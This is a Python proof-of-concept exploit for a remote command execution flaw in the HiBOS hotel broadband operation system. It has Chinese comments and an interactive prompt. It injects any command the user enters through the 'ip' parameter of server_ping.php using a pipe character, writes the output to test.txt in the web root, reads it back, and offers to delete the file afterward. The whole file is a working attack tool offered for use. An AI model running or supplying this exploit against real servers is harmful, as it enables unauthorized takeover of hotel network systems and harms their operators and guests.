import time
import sys
import requests
import os
from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse

class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:HiBOS 酒店宽带运营系统 RCE漏洞  
功能：单个检测，批量检测                                     
使用格式：python poc.py
+-----------------------------------------------------------------+                                     
''')
    #无回显，所以在根目录生成一个test.php来判断
    def poc_1(self, target_url,command):
        url = f'{target_url}/manager/radius/server_ping.php?ip=|{command} >../../test.txt&id=1'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url,headers=headers,verify=False,timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    #获取命令执行内容
    def poc_2(self,target_url):
        url = f'{target_url}/test.txt'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url,headers=headers,verify=False,timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
            
    #为了不影响系统故测试后删除文件
    def rm(self,target_url):
        url = f'{target_url}/manager/radius/server_ping.php?ip=|rm ../../test.txt&id=1'
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
            res = requests.get(url=url,headers=headers,verify=False,timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self):
        self.title()
        target_url = str(input("\033[35m请输入目标网址\nUrl   >>> \033[0m"))
        command = str(input("\033[35m请输入需要执行的命令\ncommand   >>> \033[0m"))
        self.poc_1(target_url,command)
        res_2=self.poc_2(target_url)
        if res_2.status_code==200:
            print(f"\033[36m[o] 成功执行 {command}, 响应为:\n{res_2.text} \033[0m")
        rm=str(input("\033[35m是否删除test.txt(1:是；2：否)\n   >>> \033[0m"))
        if rm =='1':
            self.rm(target_url)
            res_2=self.poc_2(target_url)
            if res_2.status_code!=200:
                print(f'\033[36m[o] test.txt已删除，请再自行打开 {target_url}/test.txt 访问确认！！！\033[0m')
        else:
            sys.exit(0)
            
if __name__ == '__main__':
    run = poc()
    run.main()